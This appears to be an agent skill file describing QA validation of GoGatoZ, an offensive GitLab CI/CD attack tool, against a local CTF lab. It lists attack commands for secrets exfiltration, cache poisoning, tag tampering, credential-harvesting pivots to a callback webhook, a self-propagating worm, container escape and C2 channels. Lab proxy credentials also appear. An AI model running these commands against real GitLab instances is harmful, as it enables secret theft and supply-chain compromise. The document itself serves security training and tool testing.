---
name: ctf-qa-validation
description: QA testing and validation of all GoGatoZ features against the CTF lab environment. Use when testing gogatoz commands, verifying CTF flag solutions, or validating lab infrastructure after code changes.
---

# GoGatoZ CTF QA Validation

Validates all GoGatoZ features against the CTF lab environment to ensure correctness after code changes.

## Prerequisites

Before running any QA checks:

1. **Lab must be running**: `cd ~/projects/gogatoz-ctf && docker compose up -d`
2. **Lab must be provisioned**: `./setup-lab.sh` (creates users, PATs, repos, runners)
3. **Binary must be fresh**: `cd ~/projects/gogatoz && go build -o gogatoz .`
4. **Flagserver must be reachable**: `curl -s http://localhost:31337/healthz`
5. **GitLab must be healthy**: `curl -s http://gitlab.local:8929/users/sign_in | head -1`

## Environment

| Variable | Value | Source |
|----------|-------|--------|
| `GITLAB_URL` | `http://gitlab.local:8929` | Lab docker-compose |
| `GITLAB_TOKEN` | See `setup-lab.sh` PAT values | CTF_CICD_BOT_PAT, etc. |
| Flagserver | `http://localhost:31337` | Port 31337→container 8080 |
| SOCKS5 (no auth) | `localhost:1080` | socks5-noauth container |
| SOCKS5 (auth) | `localhost:1081` | proxyuser/pr0xyP4ssW0rd |

## Test Tracks

### Track 1: Main Chain (Flags 1-7, 1750 pts)

Tests: search, enumerate, attack --secrets, attack --commit-ci

```bash
# Flag 1: Search + enumerate to find vulnerable projects
gogatoz search --gitlab-url $GITLAB_URL --token $TOKEN --query vuln --format json

# Flag 2: Enumerate findings on vulnerable project
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project $PROJECT --follow-includes

# Flags 3-5: Secrets exfiltration
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target $PROJECT --secrets --method artifact
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target $PROJECT --commit-ci --payload secrets

# Flags 6-7: Advanced enumeration with runners
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project $PROJECT --fetch-runners --fetch-protected
```

**Verify**: Each flag value matches `FLAG+...+` format. Submit to flagserver.

### Track 2: Supply Chain (Flags 8-10, 15; 2000 pts)

Tests: attack --commit-ci (script injection), attack --cache-poison, attack --auto-merge, attack --tamper-tag

```bash
# Flag 8: Script injection via workflow hopping
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target ctf-script-hopping --inject-script

# Flag 9: Cache poisoning
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target ctf-cache-poison --commit-ci --payload cache-poison

# Flag 10: Auto-merge self-approve
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target ctf-auto-merge --auto-merge

# Flag 15: Trivy-style tag poisoning
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target ctf-travy --tamper-tag
```

### Track 3: Pivot (Flags 11-13, 1500 pts)

Tests: gogatoz pivot with HTTP callback exfiltration

```bash
# BFS lateral movement across 3 depth levels
gogatoz pivot --gitlab-url $GITLAB_URL --token $TOKEN \
  --targets ctf-pivot-gateway \
  --webhook http://<host>:9443 \
  --max-depth 3 \
  --listen :9443
```

**Verify**: Credentials harvested at each depth, flags extracted from pivot chain projects.

### Track 4: Proxy Recon (Flag 14, 500 pts)

Tests: enumerate through SOCKS5 proxy to internal GitLab

```bash
# Discover internal GitLab via infra-automation CI vars
# Then enumerate through authenticated SOCKS5 proxy
gogatoz enumerate --gitlab-url http://gitlab-internal:8929 --token $INTERNAL_TOKEN \
  --socks5-proxy localhost:1081 --socks5-user proxyuser --socks5-pass pr0xyP4ssW0rd \
  --project root/classified-infra
```

### Track 5: LOTP (Flags 16-20, 1800 pts)

Tests: enumerate detection of LOTP patterns, attack with LOTP payloads

```bash
# Flag 16: Phantom Gyp injection (500 pts)
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-gyp-inject --commit-ci --payload ror

# Flag 17-20: LOTP detection and exploitation
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project vuln-lotp-npm --follow-includes
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project vuln-oidc-mr-risk
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project vuln-trigger-chain
gogatoz enumerate --gitlab-url $GITLAB_URL --token $TOKEN --project vuln-cache-key-injection
```

### Track 6: Advanced Attack (Flags 21-28, 3400 pts)

Tests: RoR, memory dump, worm, container escape, variable injection, C2, dependency pwnage, nested runner

```bash
# Flag 21: Runner-on-Runner exposure
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target ctf-ror-exposure --discover-tags

# Flag 22: Memory dump
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-memory-dump --commit-ci

# Flag 23: Supply chain worm (5-project propagation)
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-worm \
  --supply-chain-worm --webhook http://<host>:9443

# Flag 24: Container escape
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-escape --commit-ci

# Flag 25: Variable injection
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-var-inject --commit-ci

# Flag 26: C2 channel
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-c2 --commit-ci

# Flag 27: Dependency pwnage matrix
gogatoz bloodhound --gitlab-url $GITLAB_URL --token $TOKEN --project vuln-dep-crown

# Flag 28: Nested runner C2
gogatoz attack --gitlab-url $GITLAB_URL --token $TOKEN --target vuln-nested-runner --ror-listen
```

## Validation Checklist

After code changes, verify:

- [ ] `go build ./...` passes
- [ ] `go test -race ./...` passes
- [ ] `make lint` passes (golangci-lint v2)
- [ ] Lab starts cleanly: `docker compose up -d && ./setup-lab.sh`
- [ ] Flagserver healthz: `curl localhost:31337/healthz`
- [ ] Search command returns vuln projects (text + JSON output)
- [ ] Enumerate command detects findings with correct severity
- [ ] Attack --secrets exfiltrates and decrypts variables
- [ ] Attack --commit-ci creates pipeline with correct YAML
- [ ] Pivot completes at least depth 1 with credential harvest
- [ ] SOCKS5 proxy routing works (both authed and unauthed)
- [ ] SARIF output validates against SARIF schema
- [ ] GitLab SAST output validates format
- [ ] Notify command sends to Discord/Apprise
- [ ] Parse command deduplicates correctly
- [ ] BloodHound export produces valid OpenGraph JSON
- [ ] API server responds to requests (with and without API key)
- [ ] Flag values use `FLAG+...+` format (not `FLAG{...}`)

## Reference Projects

- **GoGatoZ source**: `~/projects/gogatoz`
- **CTF lab**: `~/projects/gogatoz-ctf`
- **Course docs**: `~/projects/hackers-guide-to-cicd`
- **Lab walkthrough**: `~/projects/hackers-guide-to-cicd/a-hackers-guide-to-cicd/src/content/docs/labs/gitlab-exploitation/`
- **Flag definitions**: `~/projects/gogatoz-ctf/setup-lab.sh` (search for CTF_FLAGS_B64)

## Quick Smoke Test

Minimal validation after a code change:

```bash
cd ~/projects/gogatoz
go build -o gogatoz . && \
go test -race ./... && \
./gogatoz search --gitlab-url http://gitlab.local:8929 --token $TOKEN --query vuln --format json | head -5 && \
./gogatoz enumerate --gitlab-url http://gitlab.local:8929 --token $TOKEN --project MrPMillz/vuln --format json | jq '.findings | length'
```
